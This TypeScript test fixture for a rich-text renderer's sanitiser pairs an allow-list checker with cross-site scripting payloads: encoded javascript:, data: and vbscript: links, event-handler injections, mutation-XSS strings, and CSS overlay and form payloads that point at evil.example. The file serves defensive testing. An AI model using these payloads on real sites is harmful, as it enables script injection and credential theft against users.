import { isSafeHref } from "../is-safe-href";
import type { RichTextDoc, RichTextNode } from "../types";

/** Elements the renderer may output, with the attributes each may carry. */
const ALLOWED: Record<string, string[]> = {
  div: ["class"],
  p: ["style"],
  h1: ["style"],
  h2: ["style"],
  h3: ["style"],
  h4: ["style"],
  h5: ["style"],
  h6: ["style"],
  strong: [],
  em: [],
  u: [],
  s: [],
  code: ["class"],
  pre: [],
  a: ["href", "target", "rel", "title"],
  ul: [],
  ol: ["start", "type"],
  li: [],
  blockquote: [],
  br: [],
  hr: [],
};

const DANGEROUS_URL = /^(javascript|data|vbscript):/i;

/**
 * Checks every element below `root`: only elements and attributes the
 * renderer may output, no on* attributes, no script URLs, only valid
 * text-align styles and only language-* classes on code.
 */
export const expectSafe = (root: ParentNode) => {
  for (const el of Array.from(root.querySelectorAll("*"))) {
    const tag = el.tagName.toLowerCase();

    expect(Object.keys(ALLOWED)).toContain(tag);

    for (const { name, value } of Array.from(el.attributes)) {
      expect(ALLOWED[tag]).toContain(name);
      expect(name).not.toMatch(/^on/i);
      expect(value.replace(/[\u0000- ]/g, "")).not.toMatch(DANGEROUS_URL);

      if (name === "href") expect(isSafeHref(value)).toBe(true);
      if (name === "style") {
        expect(value).toMatch(/^text-align: ?(left|center|right|justify);?$/);
      }
      if (name === "class" && tag === "code") {
        expect(value).toMatch(/^language-[A-Za-z0-9_+#.-]+$/);
      }
      if (name === "class" && tag === "div") {
        expect(["RichTextEditor", "rich-text"]).toContain(value);
      }
    }
  }
};

export const linkDoc = (href: unknown): RichTextDoc => ({
  type: "doc",
  content: [
    {
      type: "paragraph",
      content: [
        {
          type: "text",
          text: "click",
          marks: [{ type: "link", attrs: { href } }],
        },
      ],
    },
  ],
});

const docWith = (...content: RichTextNode[]): RichTextDoc => ({
  type: "doc",
  content,
});

const text = (value: string): RichTextNode => ({ type: "text", text: value });

/** Tampered JSON documents. Each must render with expectSafe passing. */
export const tamperedJson: Record<string, unknown> = {
  "javascript: href": linkDoc("javascript:alert(1)"),
  "uppercase JAVASCRIPT: href": linkDoc("JAVASCRIPT:alert(1)"),
  "href with leading whitespace": linkDoc("  javascript:alert(1)"),
  "href with a leading control character": linkDoc("\u0001javascript:alert(1)"),
  "href with an embedded tab": linkDoc("java\tscript:alert(1)"),
  "entity-encoded javascript: href": linkDoc("&#106;avascript:alert(1)"),
  "hex entity-encoded javascript: href": linkDoc("&#x6A;avascript:alert(1)"),
  "data: href": linkDoc("data:text/html,<script>alert(1)</script>"),
  "vbscript: href": linkDoc("vbscript:msgbox(1)"),
  "CSS injection through textAlign": docWith(
    {
      type: "paragraph",
      attrs: { textAlign: "center; background:url(//evil.example/x)" },
      content: [text("p")],
    },
    {
      type: "heading",
      attrs: { level: 2, textAlign: "left;position:fixed;inset:0" },
      content: [text("h")],
    }
  ),
  "unknown nodes": docWith(
    { type: "script", content: [text("alert(1)")] },
    { type: "iframe", attrs: { srcdoc: "<script>alert(1)</script>" } },
    { type: "image", attrs: { src: "x", onerror: "alert(1)" } },
    {
      type: "paragraph",
      content: [
        { type: "svg", attrs: { onload: "alert(1)" }, content: [text("s")] },
      ],
    }
  ),
  "unknown marks": docWith({
    type: "paragraph",
    content: [
      {
        type: "text",
        text: "x",
        marks: [
          { type: "span", attrs: { onclick: "alert(1)" } },
          { type: "textStyle", attrs: { style: "position:fixed;inset:0" } },
        ],
      },
    ],
  }),
  "on* and style attributes": docWith(
    {
      type: "paragraph",
      attrs: { onclick: "alert(1)", style: "position:fixed" },
      content: [
        {
          type: "text",
          text: "x",
          marks: [
            {
              type: "link",
              attrs: {
                href: "https://example.com",
                onmouseover: "alert(1)",
                style: "position:fixed",
                class: "fixed inset-0",
              },
            },
          ],
        },
      ],
    },
    {
      type: "orderedList",
      attrs: { start: 2, onclick: "alert(1)", type: "1 onclick=alert(1)" },
      content: [
        {
          type: "listItem",
          content: [{ type: "paragraph", content: [text("li")] }],
        },
      ],
    },
    {
      type: "codeBlock",
      attrs: { language: 'x" onmouseover="alert(1)', onclick: "alert(1)" },
      content: [text("code")],
    },
    {
      type: "heading",
      attrs: { level: "1 onclick=alert(1)", onclick: "alert(1)" },
      content: [text("h")],
    }
  ),
  "prototype member types": docWith(
    { type: "constructor", content: [text("a")] } as RichTextNode,
    { type: "__proto__", content: [text("b")] } as RichTextNode,
    { type: "toString", content: [text("c")] } as RichTextNode,
    {
      type: "paragraph",
      content: [
        {
          type: "text",
          text: "d",
          marks: [
            { type: "constructor" },
            { type: "__proto__" },
            { type: "valueOf" },
          ],
        },
      ],
    }
  ),
  "non-string types": {
    type: "doc",
    content: [
      { type: 1, content: [text("a")] },
      { type: null, content: [text("b")] },
      { type: { name: "paragraph" }, content: [text("c")] },
      { type: ["paragraph"], content: [text("d")] },
      { content: [text("e")] },
    ],
  },
};

/**
 * The legacy HTML payloads from the v0.23.0 security review (gap-v0230-sec),
 * plus a legitimate document. As strings, all of them must stay plain text.
 */
export const legacyHtml: Record<string, string> = {
  P01_img_onerror: `<p>hi</p><img src=x onerror="alert(1)">`,
  P02_svg_onload: `<svg><svg onload=alert(1)>`,
  P03_a_javascript: `<a href="javascript:alert(1)">x</a>`,
  P04_iframe_srcdoc: `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  P05_details_ontoggle: `<details open ontoggle=alert(1)>`,
  P06_mxss_math_style: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  P07_css_overlay: `<p style="position:fixed;inset:0;z-index:99999;background:url(https://evil.example/b)">x</p>`,
  P08_form_input: `<form action="https://evil.example"><input name=pw></form>`,
  P09_entity_js: `<a href="&#x6A;avascript:alert(1)">e</a>`,
  P10_deep_b5000: `<img src=x onerror="alert(1)">` + "<b>".repeat(5000) + "x",
  P11_noscript_mxss: `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
  P12_ctrl_js: `<a href="\u0001javascript:alert(1)">c</a>`,
  P13_legit: `<h2 style="text-align: center">Title</h2><p><strong>bold</strong> <a href="https://example.com">link</a></p>`,
  script_tag: `<script>alert(1)</script>`,
};

/** Every payload above as [description, value] pairs, for it.each. */
export const xssPayloads: [string, unknown][] = [
  ...Object.keys(tamperedJson).map((name): [string, unknown] => [
    `tampered JSON: ${name}`,
    tamperedJson[name],
  ]),
  ...Object.keys(legacyHtml).map((name): [string, unknown] => [
    `legacy HTML string: ${name}`,
    legacyHtml[name],
  ]),
];
